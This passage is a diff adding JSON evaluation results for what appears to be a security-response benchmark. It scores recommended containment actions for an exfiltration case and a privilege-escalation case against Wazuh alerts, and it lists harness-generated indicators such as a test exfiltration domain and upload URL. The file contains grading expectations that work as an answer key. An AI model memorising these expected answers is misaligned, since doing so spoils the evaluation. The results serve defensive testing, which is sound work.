+        "correctRecommendation": {
+          "caseId": "TC-09",
+          "correct": false,
+          "playbookMatch": true,
+          "actionTargetMatches": false,
+          "missingRecommendations": [
+            {
+              "action": "ACT-BLOCK-DOMAIN",
+              "acceptableTargets": [
+                "vigix-eval-exfil.net"
+              ]
+            }
+          ],
+          "unexpectedRecommendations": [
+            {
+              "action": "ACT-BLOCK-URL",
+              "target": "http://vigix-eval-exfil.net:8080/upload"
+            },
+            {
+              "action": "ACT-ISOLATE-ENDPOINT",
+              "target": "attack-endpoint"
+            }
+          ],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-BLOCK-DESTINATION-IP",
+              "target": "172.19.0.8"
+            }
+          ],
+          "reason": "missing: ACT-BLOCK-DOMAIN -> vigix-eval-exfil.net | unexpected: ACT-BLOCK-URL -> http://vigix-eval-exfil.net:8080/upload; ACT-ISOLATE-ENDPOINT -> attack-endpoint"
+        }
+      },
+      "verification": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "classification": "NO_MATCH_COVERED",
+        "totalMatched": 0,
+        "ignoredEvents": 0,
+        "correlationReasons": {},
+        "coverageComplete": true,
+        "coverageGaps": []
+      },
+      "observations": [
+        {
+          "type": "IPV4",
+          "value": "172.19.0.7",
+          "sourcePath": "data.srcip",
+          "role": "ENDPOINT_SELF",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "IPV4",
+          "value": "172.19.0.8",
+          "sourcePath": "data.dstip",
+          "role": "DESTINATION",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-exfil.net",
+          "sourcePath": "data.dns.question.name",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "URL",
+          "value": "http://vigix-eval-exfil.net:8080/upload",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "DOMAIN",
+          "value": "vigix-eval-exfil.net",
+          "sourcePath": "data.url",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        },
+        {
+          "type": "FILE_PATH",
+          "value": "/tmp/test-data.txt",
+          "sourcePath": "data.file",
+          "role": "ARTIFACT",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 3,
+            "found": 3,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.5",
+            "vigix-eval-exfil.net",
+            "http://vigix-eval-exfil.net:8080/upload",
+            "attack-endpoint"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 3,
+            "found": 3,
+            "missing": []
+          },
+          "verificationResult": "RESOLVED",
+          "verificationMode": "REAL_WAZUH",
+          "actualTargets": [
+            "172.19.0.8",
+            "vigix-eval-exfil.net",
+            "attack-endpoint"
+          ]
+        }
+      ]
+    },
+    {
+      "caseId": "TC-10",
+      "attackName": "Privilege Escalation",
+      "telemetry": "REAL_ACTION_CUSTOM_RULE",
+      "provenance": {
+        "class": "HARNESS_GENERATED",
+        "basis": [
+          "rule.groups contains vigix_eval"
+        ]
+      },
+      "alert": {
+        "ruleId": "100350",
+        "level": 14,
+        "agent": "attack-endpoint",
+        "indexerDocId": "49fTGqEBgh2xXWqmZLXk"
+      },
+      "completeness": {
+        "account": "OBSERVED"
+      },
+      "new": {
+        "compliance": "COMPLIANT",
+        "failedChecks": [],
+        "iocRecall": {
+          "expected": 1,
+          "found": 1,
+          "missing": []
+        },
+        "actionMatch": {
+          "expectedActions": [
+            "ACT-DISABLE-ACCOUNT"
+          ],
+          "actualActions": [
+            "ACT-DISABLE-ACCOUNT",
+            "ACT-REVOKE-SESSION",
+            "ACT-RESET-CREDENTIAL",
+            "ACT-ISOLATE-ENDPOINT"
+          ],
+          "expectedActionHit": true,
+          "actualTargets": [
+            "evaluser",
+            "evaluser",
+            "evaluser",
+            "attack-endpoint"
+          ],
+          "expectedTargetHit": true
+        },
+        "verificationResult": null,
+        "verificationMode": "NONE",
+        "rehuntError": "REHUNT_INSUFFICIENT_CRITERIA",
+        "correctRecommendation": {
+          "caseId": "TC-10",
+          "correct": false,
+          "playbookMatch": true,
+          "actionTargetMatches": false,
+          "missingRecommendations": [],
+          "unexpectedRecommendations": [
+            {
+              "action": "ACT-REVOKE-SESSION",
+              "target": "evaluser"
+            },
+            {
+              "action": "ACT-RESET-CREDENTIAL",
+              "target": "evaluser"
+            },
+            {
+              "action": "ACT-ISOLATE-ENDPOINT",
+              "target": "attack-endpoint"
+            }
+          ],
+          "mismatchedTargets": [],
+          "matchedRecommendations": [
+            {
+              "action": "ACT-DISABLE-ACCOUNT",
+              "target": "evaluser"
+            }
+          ],
+          "reason": "unexpected: ACT-REVOKE-SESSION -> evaluser; ACT-RESET-CREDENTIAL -> evaluser; ACT-ISOLATE-ENDPOINT -> attack-endpoint"
+        }
+      },
+      "verification": null,
+      "observations": [
+        {
+          "type": "USERNAME",
+          "value": "evaluser",
+          "sourcePath": "data.dstuser",
+          "role": "TARGET",
+          "provenanceClass": "HARNESS_GENERATED",
+          "lastKnown": false
+        }
+      ],
+      "selfTargets": [],
+      "baselines": [
+        {
+          "label": "final-main-real-wazuh-20261001",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 1,
+            "found": 1,
+            "missing": []
+          },
+          "verificationResult": null,
+          "verificationMode": "NONE",
+          "actualTargets": [
+            "evaluser",
+            "evaluser"
+          ]
+        },
+        {
+          "label": "clean-v2-real-wazuh-20260930",
+          "compliance": "COMPLIANT",
+          "iocRecall": {
+            "expected": 1,
+            "found": 1,
+            "missing": []
+          },
+          "verificationResult": null,
+          "verificationMode": "NONE",
+          "actualTargets": [
+            "evaluser",
+            "evaluser"
+          ]
+        }
+      ]
+    }
+  ]
+}
